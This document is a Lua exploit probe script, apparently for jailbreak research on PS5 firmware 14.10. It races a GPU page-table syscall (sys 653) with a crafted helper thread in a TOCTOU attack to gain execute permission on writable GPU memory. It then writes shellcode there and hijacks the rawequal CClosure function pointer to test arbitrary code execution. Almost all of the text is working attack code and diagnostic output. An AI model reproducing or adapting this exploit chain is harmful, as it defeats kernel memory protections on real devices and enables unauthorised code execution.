-- CRASH_CLASS: MODERATE
-- PROBE 98b: GPU PTE W^X BYPASS — THREADED TOCTOU VARIANT
--
-- Builds on 98a (sequential GPU PTE attribute modification).
-- Adds threading to exploit TOCTOU in the PTE check path:
--   kernel CHECK page attrs → (race window) → MODIFY attrs
-- A racing thread changes page state between check and modify.
--
-- sys 653 entry mask: 0xffafffff (bits 20, 22 only in arg0)
-- Handler+0x1850: addr bounds, page type 0x409, obj type 0xb, flag check
--
-- A: GPU mmap + sys 547 query (object type, protection, size)
-- B: sys 653 reachability (bit 20/22 combos on GPU pages)
-- C: Threaded PTE TOCTOU (sys 653 loop vs sys 547 monitor)
-- D: Full W^X exploit (shellcode → CClosure redirect → exec)

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 98b: GPU PTE W^X BYPASS (THREADED) ===")
print("Section: " .. TEST_SECTION)
print("")

collectgarbage("stop")

----------------------------------------------------------------
-- helpers
----------------------------------------------------------------
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X_%08X", h, l)
end
local function fmt_addr(val) return fmt(val) end
local function zero(buf, n)
    for off = 0, n - 4, 4 do safe_wd(buf + off, 0) end
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

----------------------------------------------------------------
-- syscalls
----------------------------------------------------------------
local sc477 = make_syscall(477)   -- mmap
local sc547 = make_syscall(547)   -- VM region query
local sc653 = make_syscall(653)   -- GPU PTE modifier
local sc430 = make_syscall(430)   -- thr_create
local sc433 = make_syscall(433)   -- thr_kill
local sc240 = make_syscall(240)   -- nanosleep
local sc624 = make_syscall(624)   -- VM op counter

local pid = to_num(syscall.getpid())
print("PID: " .. pid)

local function alive()
    local ok, p = pcall(function() return to_num(syscall.getpid()) end)
    return ok and p == pid
end
local function msleep(ms)
    local ts = memory.alloc(16)
    safe_wq(ts, uint64(0))
    safe_wq(ts + 8, uint64(ms * 1000000))
    pcall(function() sc240(uint64(ts), uint64(0)) end)
end

-- ucontext offsets (confirmed 14.10)
local C_RDI   = 0x048
local C_RSI   = 0x050
local C_RDX   = 0x058
local C_RAX   = 0x078
local C_CS    = 0x0C0
local C_FLAGS = 0x0D0
local C_RIP   = 0x0E0
local C_RSP   = 0x0F8
local C_SS    = 0x100
local C_MAGIC = 0x108
local C_TYPE  = 0x110

-- GPU mmap helper
local function gpu_mmap(npages)
    local ok, addr = pcall(function()
        return sc477(uint64(0), uint64(npages * 0x4000), uint64(0x03),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return nil end
    local h, _ = get_hi_lo(addr)
    if h < 0 then h = h + 0x100000000 end
    if h == 0xFFFFFFFF then return nil end
    return addr
end

-- sys 547 query helper → {prot, has_gpu_obj, raw[0..5]}
local function query_region(addr)
    local out = memory.alloc(0x40)
    zero(out, 0x40)
    local ok, rv = pcall(function() return sc547(uint64(addr), uint64(out)) end)
    if not ok or to_num(rv) ~= 0 then return nil end
    local r = {}
    r.prot = safe_rd(out + 0x10) or 0
    r.has_gpu_obj = false
    for i = 0, 0x1F do
        local b = safe_rd(out + i)
        if b and b == 0x0B then r.has_gpu_obj = true; r.obj_off = i end
    end
    r.raw = {}
    for i = 0, 5 do r.raw[i] = safe_rq(out + i * 8) end
    return r
end

-- Check if protection includes execute bit
local function has_exec(prot)
    if prot % 8 >= 4 then return true end       -- PROT_EXEC (bit 2)
    if prot % 32 >= 16 then return true end      -- alt X encoding
    return false
end

----------------------------------------------------------------
if TEST_SECTION == "A" then
----------------------------------------------------------------
print("--- Section A: GPU mmap + sys 547 VM region query ---")
print("")

local gpu = gpu_mmap(256)
if not gpu then
    print("GPU mmap FAILED"); print("=== PROBE 98b COMPLETE ==="); return
end
print("[A1] GPU addr=" .. fmt(gpu))

-- Verify RW
safe_wd(gpu, 0xDEADBEEF)
local rb = safe_rd(gpu)
print("  RW: " .. (rb == 0xDEADBEEF and "CONFIRMED" or "FAIL"))
print("")

-- Query GPU, heap, eboot for comparison
local regions = {
    {"GPU",  gpu},
    {"heap", memory.alloc(0x4000)},
}
local pipe_str = tostring(syscall.pipe)
local eboot_str = pipe_str:match("eboot%.bin @ (0x[0-9a-fA-F]+)")
if eboot_str then
    regions[#regions + 1] = {"eboot", uint64(eboot_str)}
end

for _, entry in ipairs(regions) do
    local name, addr = entry[1], entry[2]
    print(string.format("[A] sys 547 on %s:", name))
    local info = query_region(addr)
    if info then
        print(string.format("  prot=0x%X  GPU_obj=%s", info.prot,
            info.has_gpu_obj and string.format("YES(+0x%X)", info.obj_off) or "NO"))
        for i = 0, 3 do
            local v = info.raw[i]
            local tag = is_kptr(v) and " ***KPTR***" or ""
            print(string.format("  +0x%02X: %s%s", i * 8, fmt(v), tag))
        end
    else
        print("  query FAILED")
    end
    print("")
end

print("[DONE] Section A complete")

----------------------------------------------------------------
elseif TEST_SECTION == "B" then
----------------------------------------------------------------
print("--- Section B: sys 653 reachability sweep ---")
print("  Mask 0xffafffff: valid arg0 = 0x0, 0x100000, 0x400000, 0x500000")
print("")

local gpu = gpu_mmap(256)
if not gpu then
    print("GPU mmap FAILED"); print("=== PROBE 98b COMPLETE ==="); return
end
print("[B1] GPU addr=" .. fmt(gpu))
local gpu_h, gpu_l = get_hi_lo(gpu)
if gpu_h < 0 then gpu_h = gpu_h + 0x100000000 end
if gpu_l < 0 then gpu_l = gpu_l + 0x100000000 end
print("")

-- B2: Raw arg0 sweep
print("[B2] sys 653 raw arg0 sweep:")
for _, arg in ipairs({0, 0x100000, 0x400000, 0x500000, 1, 0xFF}) do
    local ok, rv = pcall(function() return sc653(uint64(arg)) end)
    print(string.format("  0x%06X: ret=%s", arg, ok and fmt(rv) or "PCALL-FAIL"))
    if not alive() then print("  *** KILLED ***"); break end
end
print("")

-- B3: Struct-based (GPU addr in struct)
print("[B3] sys 653 with param struct:")
local param = memory.alloc(0x200)
for _, trial in ipairs({
    {"zero struct", function() end},
    {"gpu+size",    function() safe_wq(param, uint64(gpu)); safe_wq(param+8, uint64(0x4000)) end},
    {"gpu+0x100000",function() safe_wq(param, uint64(gpu)); safe_wd(param+8, 0x100000) end},
    {"gpu+0x400000",function() safe_wq(param, uint64(gpu)); safe_wd(param+8, 0x400000) end},
}) do
    zero(param, 0x40); trial[2]()
    local ok, rv = pcall(function() return sc653(uint64(param)) end)
    print(string.format("  %s: ret=%s", trial[1], ok and fmt(rv) or "PCALL-FAIL"))
    if not alive() then break end
end
print("")

-- B4: Combined address+flag values
print("[B4] sys 653 combined addr|flag:")
for _, combo in ipairs({
    {gpu_h, gpu_l,             "raw GPU"},
    {gpu_h, gpu_l + 0x100000, "GPU|b20"},
    {gpu_h, gpu_l + 0x400000, "GPU|b22"},
    {gpu_h, gpu_l + 0x500000, "GPU|b20+22"},
    {0,     0x100000,          "b20 only"},
    {0,     0x500000,          "b20+22 only"},
}) do
    local arg_val = combo[1] == 0 and uint64(combo[2])
        or uint64(string.format("0x%X%08X", combo[1], combo[2]))
    local ok, rv = pcall(function() return sc653(arg_val) end)
    local tag = ""
    if ok then
        local _, rl = get_hi_lo(rv)
        if rl < 0 then rl = rl + 0x100000000 end
        if rl == 0 then tag = " *** RET=0 ***" end
    end
    print(string.format("  %s: ret=%s%s", combo[3], ok and fmt(rv) or "FAIL", tag))
    if not alive() then break end
end
print("")

-- B5: Multi-arg variants (flags, gpu_addr, param_struct)
print("[B5] sys 653 multi-arg:")
for _, f in ipairs({0x100000, 0x400000, 0x500000, 0}) do
    zero(param, 0x40)
    local ok, rv = pcall(function()
        return sc653(uint64(f), uint64(gpu), uint64(param))
    end)
    local tag = ""
    if ok then
        local _, rl = get_hi_lo(rv)
        if rl < 0 then rl = rl + 0x100000000 end
        if rl == 0 then tag = " *** RET=0 ***" end
    end
    print(string.format("  flag=0x%X: ret=%s%s", f, ok and fmt(rv) or "FAIL", tag))
    if not alive() then break end
end

print("")
print("[DONE] Section B complete")

----------------------------------------------------------------
elseif TEST_SECTION == "C" then
----------------------------------------------------------------
print("--- Section C: Threaded PTE TOCTOU ---")
print("  Thread A (main): sys 653 with attribute flags")
print("  Thread B (child): scheduling pressure via gettimeofday")
print("  Main also polls sys 547 to detect protection changes")
print("")

local SW = syscall.syscall_address
if SW == nil then
    print("syscall.syscall_address nil — no threads")
    print("=== PROBE 98b COMPLETE ==="); return
end
local sw_hi, sw_lo = get_hi_lo(SW)
if sw_hi < 0 then sw_hi = sw_hi + 0x100000000 end
if sw_lo < 0 then sw_lo = sw_lo + 0x100000000 end
if sw_lo < 7 then sw_lo = sw_lo + 0x100000000 - 7; sw_hi = sw_hi - 1
else sw_lo = sw_lo - 7 end
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo))
print("wrapper=" .. fmt(wrapper))

local gpu = gpu_mmap(256)
if not gpu then
    print("GPU mmap FAILED"); print("=== PROBE 98b COMPLETE ==="); return
end
print("[C1] GPU addr=" .. fmt(gpu))
safe_wd(gpu, 0xCAFEBABE)
print("  RW: " .. (safe_rd(gpu) == 0xCAFEBABE and "OK" or "FAIL"))

-- Baseline protection
local pre = query_region(gpu)
if pre then
    print(string.format("  baseline prot=0x%X  GPU_obj=%s", pre.prot,
        pre.has_gpu_obj and "YES" or "NO"))
end
print("")

-- Shared page for child (gettimeofday writes timeval here)
local shared = memory.alloc(0x4000)
zero(shared, 0x4000)

-- Spawn child thread (157a cycling-stack pattern)
print("[C2] Spawning child thread ...")
repeat
    local STACK_SIZE = 0x100000
    local ok_stk, stack_base = pcall(function()
        return sc477(uint64(0), uint64(STACK_SIZE), uint64(3), uint64(0x1002),
                     uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then print("  stack mmap failed"); break end

    -- Fill stack: every ret re-enters the syscall wrapper
    for off = 0, STACK_SIZE - 8, 8 do safe_wq(stack_base + off, wrapper) end

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    safe_wq(ctx + C_MAGIC, uint64(0x480))
    safe_wd(ctx + C_FLAGS, 0)
    safe_wq(ctx + C_TYPE,  uint64(0x10000))
    safe_wq(ctx + C_CS,    uint64(0x43))
    safe_wq(ctx + C_SS,    uint64(0x3B))
    safe_wq(ctx + C_RIP,   wrapper)
    safe_wq(ctx + C_RSP,   stack_base)
    safe_wq(ctx + C_RAX,   uint64(116))  -- gettimeofday
    safe_wq(ctx + C_RDI,   shared)
    safe_wq(ctx + C_RSI,   uint64(0))

    local tid_buf = memory.alloc(8); zero(tid_buf, 8)
    local ok_tc, rv_tc = pcall(function()
        return sc430(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local child_tid = safe_rq(tid_buf)
    print("  thr_create rv=" .. to_num(rv_tc) .. " tid=" .. fmt(child_tid))
    if to_num(rv_tc) ~= 0 then print("  FAILED"); break end

    msleep(20)
    local s1 = safe_rd(shared); msleep(20); local s2 = safe_rd(shared)
    print("  child alive: " .. ((s2 or 0) ~= (s1 or 0) and "YES" or "MAYBE"))
    print("")

    -- C3: TOCTOU race loop
    print("[C3] Race loop: sys 653 + sys 547 interleaved, child adding pressure")
    local RACE_ITERS = 500
    local x_seen = false
    local prot_changes = 0
    local last_prot = nil
    local out_buf = memory.alloc(0x40)
    local param = memory.alloc(0x200)
    local flags = {0x100000, 0x400000, 0x500000, 0x000000}

    for i = 1, RACE_ITERS do
        local flag = flags[((i - 1) % #flags) + 1]
        local style = ((i - 1) % 3) + 1

        -- Issue sys 653
        if style == 1 then
            pcall(function() return sc653(uint64(flag)) end)
        elseif style == 2 then
            zero(param, 0x40); safe_wq(param, uint64(gpu)); safe_wd(param+8, flag)
            pcall(function() return sc653(uint64(param)) end)
        else
            zero(param, 0x40)
            pcall(function() return sc653(uint64(flag), uint64(gpu), uint64(param)) end)
        end

        -- Query protection
        zero(out_buf, 0x40)
        local ok_q, rv_q = pcall(function()
            return sc547(uint64(gpu), uint64(out_buf))
        end)
        if ok_q and to_num(rv_q) == 0 then
            local cur = safe_rd(out_buf + 0x10) or 0
            if has_exec(cur) then
                print(string.format("  *** iter %d: X BIT! prot=0x%X flag=0x%X style=%d ***",
                    i, cur, flag, style))
                x_seen = true
            end
            if last_prot and cur ~= last_prot then
                prot_changes = prot_changes + 1
                if prot_changes <= 5 then
                    print(string.format("  iter %d: prot 0x%X->0x%X", i, last_prot, cur))
                end
            end
            last_prot = cur
        end

        if i % 100 == 0 then
            print(string.format("  [%d] prot=0x%X x=%s", i, last_prot or 0,
                x_seen and "YES" or "no"))
        end
        if not alive() then print("  *** KILLED at " .. i .. " ***"); break end
    end

    print(string.format("[C4] Result: %d iters, %d prot changes, X: %s",
        RACE_ITERS, prot_changes, x_seen and "YES — W^X POSSIBLE" or "NOT SEEN"))
    print("")

    -- C5: Tight alternation race (alternate bit20/bit22 every iter)
    print("[C5] Tight race: alternating flags, 300 iters")
    local tight_x = false
    local tight_ch = 0
    last_prot = nil
    for i = 1, 300 do
        local f = (i % 2 == 0) and 0x100000 or 0x400000
        zero(param, 0x40)
        safe_wq(param, uint64(gpu)); safe_wd(param+8, f)
        safe_wd(param+0x18, 0x04)  -- sneak PROT_EXEC in struct
        pcall(function() return sc653(uint64(f), uint64(gpu), uint64(param)) end)

        zero(out_buf, 0x40)
        local ok2, rv2 = pcall(function() return sc547(uint64(gpu), uint64(out_buf)) end)
        if ok2 and to_num(rv2) == 0 then
            local c = safe_rd(out_buf + 0x10) or 0
            if has_exec(c) then
                print(string.format("  *** TIGHT %d: X! prot=0x%X ***", i, c))
                tight_x = true
            end
            if last_prot and c ~= last_prot then tight_ch = tight_ch + 1 end
            last_prot = c
        end
        if not alive() then print("  *** KILLED ***"); break end
    end
    print(string.format("  tight: %d changes, X: %s", tight_ch, tight_x and "YES" or "no"))
    print("")

    -- Kill child
    print("[C6] Killing child ...")
    pcall(function() sc433(child_tid, uint64(9)) end)
    msleep(50)
until true

-- Post-race check
print("[C7] Post-race prot:")
if gpu then
    local post = query_region(gpu)
    if post then print(string.format("  prot=0x%X", post.prot)) end
end
local ok_s, rv_s = pcall(function() return sc624() end)
print("  stability: sys624=" .. (ok_s and fmt(rv_s) or "FAIL"))

print("")
print("[DONE] Section C complete")

----------------------------------------------------------------
elseif TEST_SECTION == "D" then
----------------------------------------------------------------
print("--- Section D: Full W^X exploit ---")
print("  Chain: GPU mmap → sys 653 → shellcode → CClosure → exec")
print("")

local gpu = gpu_mmap(256)
if not gpu then
    print("GPU mmap FAILED"); print("=== PROBE 98b COMPLETE ==="); return
end
print("[D1] GPU addr=" .. fmt(gpu))
safe_wd(gpu, 0x41414141)
print("  RW: " .. (safe_rd(gpu) == 0x41414141 and "OK" or "FAIL"))
print("")

-- D2: Try to set execute via sys 653
print("[D2] Setting execute bit via sys 653:")
local param = memory.alloc(0x200)
for _, att in ipairs({
    {"3arg 0x100000", function() zero(param,0x40)
        return pcall(function() return sc653(uint64(0x100000),uint64(gpu),uint64(param)) end) end},
    {"3arg 0x400000", function() zero(param,0x40)
        return pcall(function() return sc653(uint64(0x400000),uint64(gpu),uint64(param)) end) end},
    {"3arg 0x500000", function() zero(param,0x40)
        return pcall(function() return sc653(uint64(0x500000),uint64(gpu),uint64(param)) end) end},
    {"struct+PROT_EXEC", function() zero(param,0x40)
        safe_wq(param,uint64(gpu)); safe_wd(param+8,0x04); safe_wq(param+0x10,uint64(0x4000))
        return pcall(function() return sc653(uint64(param)) end) end},
}) do
    local ok, rv = att[2]()
    local tag = ""
    if ok then local _,rl=get_hi_lo(rv); if rl<0 then rl=rl+0x100000000 end
        if rl==0 then tag=" ***RET=0***" end end
    print(string.format("  %s: ret=%s%s", att[1], ok and fmt(rv) or "FAIL", tag))
    if not alive() then break end
end

-- Check protection
local d_info = query_region(gpu)
if d_info then
    print(string.format("  prot after: 0x%X  X=%s", d_info.prot,
        has_exec(d_info.prot) and "YES" or "NO"))
end
print("")

-- D3: Write shellcode
print("[D3] Writing shellcode:")
-- NOP sled (16 bytes)
for i = 0, 15 do pcall(function() memory.write_byte(gpu + i, 0x90) end) end
-- +0x10: xor eax,eax; ret (returns 0)
pcall(function() memory.write_byte(gpu + 0x10, 0x31) end)
pcall(function() memory.write_byte(gpu + 0x11, 0xC0) end)
pcall(function() memory.write_byte(gpu + 0x12, 0xC3) end)
-- +0x20: mov eax, 0x42; ret (returns 0x42)
pcall(function() memory.write_byte(gpu + 0x20, 0xB8) end)
pcall(function() memory.write_byte(gpu + 0x21, 0x42) end)
pcall(function() memory.write_byte(gpu + 0x22, 0x00) end)
pcall(function() memory.write_byte(gpu + 0x23, 0x00) end)
pcall(function() memory.write_byte(gpu + 0x24, 0x00) end)
pcall(function() memory.write_byte(gpu + 0x25, 0xC3) end)

print(string.format("  NOP sled:    0x%08X", safe_rd(gpu) or 0))
print(string.format("  xor eax,eax: 0x%08X", safe_rd(gpu + 0x10) or 0))
print(string.format("  mov eax,42:  0x%08X", safe_rd(gpu + 0x20) or 0))
print("")

-- D4: CClosure redirect
print("[D4] CClosure redirect:")
print("  WARNING: crashes with SIGILL/SIGSEGV if NX")
repeat
    local re_str = tostring(rawequal)
    local re_addr = re_str:match("0x[0-9a-fA-F]+")
    if not re_addr then print("  rawequal addr not found"); break end
    local rawequal_addr = uint64(re_addr)
    print("  rawequal CClosure: " .. re_addr)

    local orig_fn = safe_rq(rawequal_addr + 0x20)
    if not orig_fn then print("  cannot read +0x20"); break end
    print("  original fn: " .. fmt(orig_fn))

    -- Test 1: xor eax,eax (returns 0)
    safe_wq(rawequal_addr + 0x20, uint64(gpu + 0x10))
    local ok1, rv1 = pcall(function() return rawequal(1, 2) end)
    print("  test1 (xor): " .. (ok1 and tostring(rv1) or "FAIL (NX)"))

    if ok1 then
        print("  *** GPU PAGE EXECUTABLE — W^X BYPASS ***")
        -- Test 2: mov eax, 0x42
        safe_wq(rawequal_addr + 0x20, uint64(gpu + 0x20))
        local ok2, rv2 = pcall(function() return rawequal(1, 2) end)
        print("  test2 (0x42): " .. (ok2 and tostring(rv2) or "FAIL"))
        if ok2 and to_num(rv2) == 0x42 then
            print("  *** RETURN 0x42 — ARBITRARY CODE EXECUTION ***")
            print("  *** FULL W^X BYPASS ON PS5 14.10 ***")
        end
    else
        print("  page NX — sys 653 did not flip execute")
    end

    -- Restore
    safe_wq(rawequal_addr + 0x20, orig_fn)
    local rest = safe_rq(rawequal_addr + 0x20)
    local h1, l1 = get_hi_lo(orig_fn)
    local h2, l2 = get_hi_lo(rest)
    print("  restored: " .. (h1 == h2 and l1 == l2 and "OK" or "*** FAIL ***"))
until true

print("")
print("[DONE] Section D complete")

end

print("")
print("=== PROBE 98b COMPLETE ===")
